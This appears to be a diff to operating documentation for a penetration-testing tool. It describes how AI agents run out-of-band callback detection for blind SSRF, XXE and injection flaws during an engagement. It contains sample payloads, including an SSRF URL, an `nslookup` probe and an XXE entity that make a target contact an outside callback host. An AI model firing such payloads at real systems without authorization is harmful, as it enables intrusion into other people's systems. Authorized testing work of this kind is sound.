@@ -122,19 +122,47 @@ runtime issue in your handoff. Escalate to the operator only for shared
 infrastructure, token, DNS, or authentication failures because those are
 operator-owned controls.
 
-## Per-Agent Clients
+## OOB Procedure (mint→poll→correlate)
+
+This is the **canonical** mint→fire→poll→correlate workflow. Every OOB-callback
+technique (blind SSRF, XXE, blind SQLi, blind command injection, Log4Shell-style
+probes, and similar) follows this same loop — do not re-derive it, shortcut it, or
+eyeball the raw listener log in its place. This section is the single source other
+docs point to for this procedure.
+
+### 0. Readiness
+
+Confirm shared OOB infrastructure is up before minting anything:
+
+```bash
+vigil oob status --json
+```
+
+Proceed only when `server=true` and `frpc=true` (see "Agent OOB Readiness Check"
+above for the full interpretation table). If either is false, this is shared
+infrastructure — inspect `vigil logs oob --lines 80` and record a runtime issue
+rather than repairing it yourself.
+
+### 1. Start or reuse a named client
 
 Start one named client per agent/task that needs to run the listener. Agents
-can manage these client sessions because they are correlation handles, not shared
-FRP/server infrastructure:
+can manage these client sessions directly because they are correlation handles,
+not shared FRP/server infrastructure:
 
 ```bash
 vigil engagement list --json
+vigil oob client list
 vigil oob client start vuln-ssrf-api --engagement <engagement-key> --agent vulnerability-analyst
 ```
 
-Do NOT read the callback URL out of the client log. Mint a nonce-tagged callback
-URL per payload, then fire the **exact host `mint` prints** — call it `$OOB_HOST`:
+The client runs the listener; it is not where you read the callback URL or the
+hits. Do NOT read the callback URL out of the client log. Stop it when the task
+is done: `vigil oob client stop vuln-ssrf-api`.
+
+### 2. Mint
+
+Mint a nonce-tagged callback URL per payload, then fire the **exact host `mint`
+prints** — call it `$OOB_HOST`:
 
 ```bash
 vigil oob mint --client vuln-ssrf-api --technique ssrf --target-url <url> --param <p>
@@ -142,12 +170,18 @@ vigil oob mint --client vuln-ssrf-api --technique ssrf --target-url <url> --para
 # → http  http://<nonce>.<client-id>.oob.example.com/
 ```
 
-`mint` binds the nonce **under the running client's interactsh id** (`mint` auto-selects
-the sole running client; pass `--client <name>` when several run). That binding is what
-lets `poll` see the hit: interactsh only delivers a callback to a client's poll when the
-host carries that client's id, so a bare `<nonce>.oob.example.com` would land only in the
-raw server log, never in the per-client log `poll` reads. **Never hand-build the host —
-substitute `$OOB_HOST` (mint's `host`/`dns` output) verbatim:**
+`mint` **binds the nonce under the running client's interactsh id** (`mint`
+auto-selects the sole running client; pass `--client <name>` when several run)
+and prints the exact host to fire as its `host`/`dns` output. That binding is
+what lets `poll` see the hit: interactsh only delivers a callback to a client's
+poll when the host carries that client's id, so a bare `<nonce>.oob.example.com`
+would land only in the raw server log — never in the per-client log `poll`
+reads, and never reachable by `poll` at all. **Never hand-build the host from
+the nonce — substitute `$OOB_HOST` (mint's `host`/`dns` output) verbatim.**
+
+### 3. Fire
+
+Embed `$OOB_HOST` verbatim in the payload:
 
 ```text
 http://$OOB_HOST/ssrf-users-endpoint
@@ -155,17 +189,39 @@ nslookup $OOB_HOST
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$OOB_HOST/xxe">]>
 ```
 
-Then correlate with `vigil oob poll --client vuln-ssrf-api` (same client you minted under),
-which matches each recorded probe to its callback. `vigil oob client logs vuln-ssrf-api
---lines 80` is only a raw tail of this client's listener log for infra debugging — it does
-not correlate nonces to probes.
-
-List and stop clients:
+### 4. Poll — correlate with the SAME client you minted under
 
 ```bash
-vigil oob client list
-vigil oob client stop vuln-ssrf-api
+vigil oob poll --client vuln-ssrf-api
 ```
+
+`poll` must run against the **same client name you minted under in step 2** —
+polling a different client will not see the hit, because the nonce is bound to
+the minting client's interactsh id, not to the technique or target. `poll`
+prints `matched <N> unmatched <M>` then one line per correlated hit carrying the
+technique + target you minted with, so a matched probe<->callback pair is
+self-documenting confirmation of the vulnerability. Add `--json` to capture the
+matched set as evidence.
+
+### 5. Client logs are a raw tail, never correlation
+
+```bash
+vigil oob client logs vuln-ssrf-api --lines 80
+```
+
+This is only a raw tail of this client's listener log, useful for infra
+debugging (is the listener up, is anything arriving at all) — never the
+correlation surface. Do not read this raw tail, or the shared
+`vigil logs oob --lines 80` server/FRP tail, to decide whether a probe hit.
+Nonce<->probe attribution is `vigil oob poll --client <name>` only (step 4).
+
+### Fallback
+
+If OOB is unavailable, fall back to time-based detection (sleep payloads) and
+state in your output that OOB proof was not available. If time-based detection
+also fails and OOB proof would have been decisive, record a runtime issue that
+shared OOB infrastructure was unavailable — do not treat the technique as
+untestable and drop it silently.
 
 ## Validation
 
@@ -183,20 +239,10 @@ curl http://test123.oob.example.com/
 vigil logs oob --lines 40
 ```
 
-Use `vigil oob poll --client <name>` for vulnerability confirmation (nonce<->probe correlation); client logs and raw server logs are for infrastructure debugging only.
-
-## Agent Workflow
-
-Agents should:
-
-1. Run `vigil oob status --json` and confirm `server=true`, `frpc=true`, and the expected `domain`.
-2. Start or reuse a named client with an explicit engagement key: `vigil engagement list --json`, `vigil oob client list`, then `vigil oob client start <name> --engagement <engagement-key> --agent <agent-name>`. The client runs the listener; it is not where you read the URL or the hits.
-3. Mint a nonce-tagged callback URL per payload with `vigil oob mint --client <name> --technique <t> --target-url <url> [--param <p>]`, and embed the **exact host it prints** (`$OOB_HOST` = `<nonce>.<client-id>.oob...`) in the payload. `mint` binds the nonce under the running client's interactsh id so `poll` can correlate it; do not hand-build a bare `<nonce>.oob...` host (it would never reach `poll`).
-4. After firing, correlate probe<->callback with `vigil oob poll --client <name>` — it prints `matched <N> unmatched <M>` then one line per hit carrying the technique + target you minted with. Add `--json` to capture the matched set as evidence.
-5. `vigil oob client logs <name> --lines 80` and `vigil logs oob --lines 80` are raw listener-log tails — use them only when debugging shared server/FRP health, never for correlation.
-
-If OOB is unavailable, agents should fall back to time-based detection and state that OOB proof was
-not available.
+This smoke test only proves the shared infrastructure is reachable. For real
+per-payload vulnerability confirmation, use the full "OOB Procedure
+(mint→poll→correlate)" above — never the smoke-test's raw `curl`/`dig` output —
+as the correlation evidence.
 
 ## Notes
 
